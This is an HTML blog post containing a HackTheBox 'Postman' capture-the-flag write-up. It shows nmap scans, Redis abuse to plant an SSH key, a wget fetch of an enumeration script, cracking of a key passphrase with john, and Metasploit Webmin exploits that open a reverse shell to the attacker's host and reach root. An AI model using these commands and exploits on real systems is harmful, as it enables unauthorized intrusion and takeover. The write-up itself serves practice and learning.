@@ -1,0 +1,677 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  
+    <title>Postman HTB WriteUp :: Blog</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="HTB Postman writeup &amp;lsquo;Easy&amp;rsquo; machine, user was a bit of a challenge, rooting was easier. The process is: Scan &amp;ndash;&amp;gt; Initial foothold &amp;ndash;&amp;gt; Own User &amp;ndash;&amp;gt; Own Root.
+Initial Scan bash    # add to hosts and scan sudo echo &amp;#34;10.10.10.160 postman&amp;#34; &amp;gt;/etc/hosts sudo nmap -sV -sC -sT -O -o nmapinitial Postman   Scan results nmap    Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-27 02:33 CET Nmap scan report for postman (10." />
+<meta name="keywords" content="write, blog" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="https://raulmart.in/es/posts/postman-writeup/" />
+
+
+
+
+
+
+
+<link rel="stylesheet" href="https://raulmart.in/css/style.min.css">
+
+
+
+
+<link rel="stylesheet" href="https://raulmart.in/style.css">
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://raulmart.in/img/apple-touch-icon-144-precomposed.png">
+
+  <link rel="shortcut icon" href="https://raulmart.in/img/favicon/orange.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+<meta name="twitter:creator" content="Raúl Martín" />
+
+
+<meta property="og:locale" content="es" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Postman HTB WriteUp :: Blog">
+<meta property="og:description" content="HackTheBox Postman machine write up. Easy Linux machine." />
+<meta property="og:url" content="https://raulmart.in/es/posts/postman-writeup/" />
+<meta property="og:site_name" content="Postman HTB WriteUp" />
+
+  <meta property="og:image" content="https://raulmart.in/cover/postman.png">
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+
+  <meta property="article:published_time" content="2020-01-19 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="orange">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Blog
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/es/about/">Quiénes somos</a></li>
+        
+      
+        
+          <li><a href="/es/tags/writeup/">WriteUps</a></li>
+        
+      
+      
+    
+
+    
+    <div class="spacer"></div>
+    <ul class="language-selector">
+      <ul class="language-selector-current">
+          <li>Español ▾</li>
+      </ul>
+      <ul class="language-selector__more hidden">
+        
+        <li><a href="https://raulmart.in/">English</a></li>
+        
+        <li><a href="https://raulmart.in/es/">Español</a></li>
+        
+      </ul>
+    </ul>
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/es/about/">Quiénes somos</a></li>
+      
+    
+      
+        <li><a href="/es/tags/writeup/">WriteUps</a></li>
+      
+    
+    
+    <hr />
+        
+          <li>
+            <a href="https://raulmart.in/">English</a>
+          </li>
+        
+          <li>
+            <a href="https://raulmart.in/es/">Español</a>
+          </li>
+        
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="https://raulmart.in/es/posts/postman-writeup/">Postman HTB WriteUp</a></h1>
+  <div class="post-meta">
+    
+      <span class="post-date">
+        2020-01-19 
+      </span>
+    
+    
+    <span class="post-author">:: Raúl Martín</span>
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="https://raulmart.in/es/tags/writeup/">writeup</a>&nbsp;
+    
+    #<a href="https://raulmart.in/es/tags/hackthebox/">hackthebox</a>&nbsp;
+    
+    #<a href="https://raulmart.in/es/tags/linux/">linux</a>&nbsp;
+    
+    #<a href="https://raulmart.in/es/tags/easy/">easy</a>&nbsp;
+    
+  </span>
+  
+
+  
+    <img src="https://raulmart.in/cover/postman.png" class="post-cover" alt="Postman HTB WriteUp" />
+  
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="htb-postman-writeup">HTB Postman writeup<a href="#htb-postman-writeup" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>&lsquo;Easy&rsquo; machine, user was a bit of a challenge, rooting was easier.
+The process is: Scan &ndash;&gt; Initial foothold &ndash;&gt; Own User &ndash;&gt; Own Root.</p>
+<h2 id="initial-scan">Initial Scan<a href="#initial-scan" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+
+
+
+  <div class="collapsable-code">
+    <input id="256713984" type="checkbox"  />
+    <label for="256713984">
+      <span class="collapsable-code__language">bash</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+# add to hosts and scan
+sudo echo &#34;10.10.10.160    postman&#34; &gt;/etc/hosts
+sudo nmap -sV -sC -sT -O -o nmapinitial Postman
+</code></pre>
+  </div>
+
+
+<p>Scan results
+
+
+
+  <div class="collapsable-code">
+    <input id="461729538" type="checkbox"  />
+    <label for="461729538">
+      <span class="collapsable-code__language">nmap</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-nmap" ><code>
+Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-27 02:33 CET
+Nmap scan report for postman (10.10.10.160)
+Host is up (0.11s latency).
+Not shown: 997 closed ports
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
+|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
+|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
+80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: The Cyber Geek&#39;s Personal Website
+10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
+|_http-title: Site doesn&#39;t have a title (text/html; Charset=iso-8859-1).
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=12/27%OT=22%CT=1%CU=39870%PV=Y%DS=2%DC=I%G=Y%TM=5E055F
+OS:9E%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)OP
+OS:S(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST
+OS:11NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)EC
+OS:N(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S&#43;%F=
+OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
+OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S&#43;%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
+OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S&#43;%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
+OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
+OS:D=S)
+
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 69.16 seconds
+
+</code></pre>
+  </div>
+
+</p>
+<p>We got an OpenSSH server and two different webservers.
+The Apache server on port 80 does not seem to contain anything interesting.</p>
+<p><img src="images/web80.png" alt="Web on port 80">
+I launched dirbuster in the background just in case while I investigated the other services.</p>
+<p>On port 10000, we got a Webmin instance, v1.910 (from the Server header). Looking at the <a href="webmin.com">official website</a>, looks like Webmin is a tool used to remotely manage UNIX machines.
+Moreover, Searching for &ldquo;Webmin 1.910&rdquo; on Google returns an interesting set of results.
+This should be easy, right?</p>
+<p><img src="images/webmingoogle.png" alt="Search results for Webmin 1.910 in Google"></p>
+<p>Most of the exploits are written for Metasploit, so lets launch it and see what we can do.</p>
+<h2 id="initial-foothold">Initial foothold?<a href="#initial-foothold" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Lets launch Metasploit and search for the Webmin exploits.
+
+
+
+  <div class="collapsable-code">
+    <input id="267598341" type="checkbox"  />
+    <label for="267598341">
+      <span class="collapsable-code__language">bash</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+$ sudo msfdb init
+[&#43;] Starting database
+[i] The database appears to be already configured, skipping initialization
+
+$ msfconsole
+
+       =[ metasploit v5.0.65-dev                          ]
+&#43; -- --=[ 1955 exploits - 1092 auxiliary - 336 post       ]
+&#43; -- --=[ 558 payloads - 45 encoders - 10 nops            ]
+&#43; -- --=[ 7 evasion                                       ]
+
+msf5 &gt; search webmin
+
+Matching Modules
+================
+
+   #  Name                                         Disclosure Date  Rank       Check  Description
+   -  ----                                         ---------------  ----       -----  -----------
+   0  auxiliary/admin/webmin/edit_html_fileaccess  2012-09-06       normal     No     Webmin edit_html.cgi file Parameter Traversal Arbitrary File Access
+   1  auxiliary/admin/webmin/file_disclosure       2006-06-30       normal     No     Webmin File Disclosure
+   2  exploit/linux/http/webmin_packageup_rce      2019-05-16       excellent  Yes    Webmin Package Updates Remote Command Execution
+   3  exploit/unix/webapp/webmin_backdoor          2019-08-10       excellent  Yes    Webmin password_change.cgi Backdoor
+   4  exploit/unix/webapp/webmin_show_cgi_exec     2012-09-06       excellent  Yes    Webmin /file/show.cgi Remote Command Execution
+   5  exploit/unix/webapp/webmin_upload_exec       2019-01-17       excellent  Yes    Webmin Upload Authenticated RCE
+</code></pre>
+  </div>
+
+
+From the matching modules, there are three that apply to our version (2, 3 and 5), but 2 and 5 require user credentials, so lets try 3 (<code>exploit/unix/webapp/webmin_backdoor</code>). Looking at the description, we can see that some Webmin versions served by SourceForge were backdoored, and this exploit will try to use the introduced backdoor to gain access.</p>
+
+
+
+  <div class="collapsable-code">
+    <input id="671485932" type="checkbox"  />
+    <label for="671485932">
+      <span class="collapsable-code__language">bash</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+msf5 &gt; use exploit/unix/webapp/webmin_backdoor
+msf5 exploit(unix/webapp/webmin_backdoor) &gt; show options
+
+Module options (exploit/unix/webapp/webmin_backdoor):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
+   RPORT      10000            yes       The target port (TCP)
+   SRVHOST    0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0
+   SRVPORT    8080             yes       The local port to listen on.
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI  /                yes       Base path to Webmin
+   URIPATH                     no        The URI to use for this exploit (default is random)
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (cmd/unix/reverse_perl):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic (Unix In-Memory)
+
+
+msf5 exploit(unix/webapp/webmin_backdoor) &gt; set RHOSTS Postman
+RHOSTS =&gt; Postman
+msf5 exploit(unix/webapp/webmin_backdoor) &gt; set SRVHOST 10.10.14.200
+SRVHOST =&gt; 10.10.14.200
+msf5 exploit(unix/webapp/webmin_backdoor) &gt; set SSL true
+SSL =&gt; true
+msf5 exploit(unix/webapp/webmin_backdoor) &gt; set LHOST 10.10.14.200
+LHOST =&gt; 10.10.14.200
+msf5 exploit(unix/webapp/webmin_backdoor) &gt; run
+
+[*] Started reverse TCP handler on 10.10.14.200:4444
+[-] Exploit aborted due to failure: not-vulnerable: Set ForceExploit to override
+[*] Exploit completed, but no session was created.
+msf5 exploit(unix/webapp/webmin_backdoor) &gt;
+</code></pre>
+  </div>
+
+
+<p>The exploit failed, looks like our target is not vulnerable. Looks like a dead end, and dirbuster did not find anything. What did we miss?</p>
+<h2 id="initial-scan---part-2--_ツ_"><del>Initial</del> Scan - Part 2  ¯\<em>(ツ)</em>/¯<a href="#initial-scan---part-2--_ツ_" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Lets launch nmap again, scanning all ports this time:
+
+
+
+  <div class="collapsable-code">
+    <input id="362814579" type="checkbox"  />
+    <label for="362814579">
+      <span class="collapsable-code__language">bash</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+sudo nmap -sV -sC -sT -O -p- -o nmapinitial Postman
+</code></pre>
+  </div>
+
+</p>
+<p>truncated output:
+
+
+
+  <div class="collapsable-code">
+    <input id="495136782" type="checkbox"  />
+    <label for="495136782">
+      <span class="collapsable-code__language">nmap</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-nmap" ><code>
+....
+Nmap scan report for postman (10.10.10.160)
+Host is up (0.17s latency).
+Not shown: 65494 closed ports, 37 filtered ports
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
+|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
+|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
+80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: The Cyber Geek&#39;s Personal Website
+6379/tcp  open  redis   Redis key-value store 4.0.9
+10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
+|_http-server-header: MiniServ/1.910
+|_http-title: Site doesn&#39;t have a title (text/html; Charset=iso-8859-1).
+...
+</code></pre>
+  </div>
+
+
+Ouch, we got a Redis server that went unnoticed, and on its default port (6379).</p>
+<h2 id="initial-foothold-1">Initial foothold<a href="#initial-foothold-1" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>We can directly access the Redis server using <code>redis-cli</code>, without authentication. Redis is a key-value storage (you may think of it as a giant dictionary), so the first logical step seems to enumerate all the keys.
+
+
+
+  <div class="collapsable-code">
+    <input id="653187942" type="checkbox"  />
+    <label for="653187942">
+      <span class="collapsable-code__language">bash</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+redis-cli -h Postman
+
+Postman:6379&gt; KEYS *
+(empty list or set)
+</code></pre>
+  </div>
+
+</p>
+<p>Is there anyway to turn our Redis database access to RCE? Luckily yes, and the process is well documented <a href="https://medium.com/@Victor.Z.Zhu/redis-unauthorized-access-vulnerability-simulation-victor-zhu-ac7a71b2e419">[1]</a> <a href="https://github.com/psmiraglia/ctf/blob/master/kevgir/000-redis.md">[2]</a>
+The idea is to configure Redis to backup its data (where we will put our public ssh key) to a file named <code>authorized_keys</code>, whose path we will set to a <code>.ssh</code> folder of our convenience, so we can normally login using <code>ssh</code>.</p>
+<p>We can manually exploit it, use the redis upload Metasploit module, or use an existing <a href="https://github.com/Avinash-acid/Redis-Server-Exploit/blob/master/redis.py">Python exploit</a>. I failed to manually exploit it, there were multiple people connected to the Redis server and I was taking to long to complete the steps, so I tried the Python exploit, and after several attempts I finally got a shell.</p>
+<blockquote>
+<p>Note: If you get asked for a password after successfully installing the certificate, you may need to reset the machine.</p>
+</blockquote>
+<p>Looks like the flag is in /home/Matt, but we do not have read access. Time to escalate!</p>
+<h2 id="escalating-to-user">Escalating to user<a href="#escalating-to-user" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Using the redis account, lets enumerate the machine, using the helper script <a href="https://raw.githubusercontent.com/SolomonSklash/htbenum/master/htbenum.sh"><code>htbenum</code></a>.</p>
+<p>On the host machine:
+
+
+
+  <div class="collapsable-code">
+    <input id="593682417" type="checkbox"  />
+    <label for="593682417">
+      <span class="collapsable-code__language">bash</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+./htbenum.sh -u
+./htbenum.sh -i yourip -p 8080 -w
+</code></pre>
+  </div>
+
+</p>
+<p>On the remote machine:
+
+
+
+  <div class="collapsable-code">
+    <input id="738695412" type="checkbox"  />
+    <label for="738695412">
+      <span class="collapsable-code__language">bash</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+wget http://yourip:8080/htbenum.sh -O /tmp/htbenum.sh
+chmod &#43;x ./htbenum.sh
+./htbenum.sh -i yourip -p 8080 -r
+</code></pre>
+  </div>
+
+</p>
+<p>Inside the generated report file, we get something interesting, a private (but password protected) SSH key in the /opt directory.</p>
+<p>Let&rsquo;s download it (copy pasting works fine), and try to crack it with <code>john</code>:
+
+
+
+  <div class="collapsable-code">
+    <input id="456317829" type="checkbox"  />
+    <label for="456317829">
+      <span class="collapsable-code__language">bash</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+# Convert the key to a format that john understands
+/usr/share/john/ssh2john.py key &gt;pw
+john --wordlist=/usr/share/rockyou.txt pw
+</code></pre>
+  </div>
+
+</p>
+<p>And we get the password <code>computer2008</code>. Using the private key or the password with SSH does not work, but <code>su Matt</code> from the redis user does.
+
+
+
+  <div class="collapsable-code">
+    <input id="489351672" type="checkbox"  />
+    <label for="489351672">
+      <span class="collapsable-code__language">bash</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+redis@Postman:~$ su Matt
+Password:
+Matt@Postman:/var/lib/redis$ cd
+Matt@Postman:~$ ls
+user.txt
+Matt@Postman:~$ cat user.txt
+517ad0*******************
+</code></pre>
+  </div>
+
+
+We owned user!</p>
+<h2 id="root">Root<a href="#root" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Remember the login form on port <code>10000</code> for Webmin? We got a valid pair of user/password, lets try them in the login form on <code>https://Postman:1000</code>.</p>
+<p><img src="images/webmin.png" alt="Webmin dashboard"></p>
+<p>Nice, we have valid credentials for the Webmin server! That reminds me of two exploits that needed working credentials :). Lets try with one of the exploits, <code>exploit/linux/http/webmin_packageup_rce</code></p>
+
+
+
+  <div class="collapsable-code">
+    <input id="638479125" type="checkbox"  />
+    <label for="638479125">
+      <span class="collapsable-code__language">bash</span>
+      
+      <span class="collapsable-code__toggle" data-label-expand="△" data-label-collapse="▽"></span>
+    </label>
+    <pre class="language-bash" ><code>
+msf5 &gt; use exploit/linux/http/webmin_packageup_rce
+msf5 exploit(linux/http/webmin_packageup_rce) &gt; show options
+
+Module options (exploit/linux/http/webmin_packageup_rce):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   PASSWORD                    yes       Webmin Password
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;
+   RPORT      10000            yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       Base path for Webmin application
+   USERNAME                    yes       Webmin Username
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (cmd/unix/reverse_perl):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Webmin &lt;= 1.910
+
+
+msf5 exploit(linux/http/webmin_packageup_rce) &gt; set RHOSTS Postman
+RHOSTS =&gt; Postman
+msf5 exploit(linux/http/webmin_packageup_rce) &gt; set USERNAME Matt
+USERNAME =&gt; Matt
+msf5 exploit(linux/http/webmin_packageup_rce) &gt; set PASSWORD computer2008
+PASSWORD =&gt; computer2008
+msf5 exploit(linux/http/webmin_packageup_rce) &gt; set SSL true
+SSL =&gt; true
+msf5 exploit(linux/http/webmin_packageup_rce) &gt; set LHOST 10.10.14.200
+LHOST =&gt; 10.10.14.200
+msf5 exploit(linux/http/webmin_packageup_rce) &gt; run
+
+[*] Started reverse TCP handler on 10.10.14.200:4444
+[&#43;] Session cookie: dc92983ded0f9a0bf48d72e23b8ee903
+[*] Attempting to execute the payload...
+[*] Command shell session 1 opened (10.10.14.200:4444 -&gt; 10.10.10.160:39002) at 2019-12-29 03:50:33 &#43;0100
+&gt;whoami
+root
+&gt;ls /root/
+redis-5.0.0
+root.txt
+&gt;cat /root/root.txt
+a2577*************************
+</code></pre>
+  </div>
+
+
+<p>And we owned root.</p>
+<h2 id="acknowledgments">Acknowledgments<a href="#acknowledgments" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>Thanks to @J4ri for the nudge that led to the discover of the Redis server, that went completely unnoticed at first.</p>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Leer otras publicaciones</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="https://raulmart.in/es/posts/openadmin-writeup/">
+                <span class="button__icon">←</span>
+                <span class="button__text">OpenAdmin HTB WriteUp</span>
+            </a>
+        </span>
+        
+        
+        <span class="button next">
+            <a href="https://raulmart.in/es/posts/traverxec-writeup/">
+                <span class="button__text">Traverxec HTB WriteUp</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2020 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script src="https://raulmart.in/js/menu.js"></script>
+<script src="https://raulmart.in/js/prism.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
